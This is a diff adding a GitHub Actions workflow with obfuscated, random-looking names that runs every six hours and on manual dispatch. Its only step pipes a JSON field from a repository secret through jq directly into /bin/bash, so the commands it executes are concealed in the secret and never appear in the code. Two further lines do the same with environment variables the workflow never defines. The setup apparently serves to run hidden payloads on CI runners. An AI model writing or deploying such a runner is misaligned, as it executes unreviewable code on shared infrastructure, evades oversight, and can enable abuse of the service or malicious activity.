@@ -1,0 +1,21 @@
+name: gechundan5678
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '44 4/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: gechundan5678
+        env:
+          r2874: ${{ secrets.r2874 }}
+        run: |
+          echo $r2874 | jq -r .vcasy91 | /bin/bash
+          echo $isu64697 | jq -r .afs416 | /bin/bash
+          echo $cdg9966 | jq -r .japu0522 | /bin/bash
+
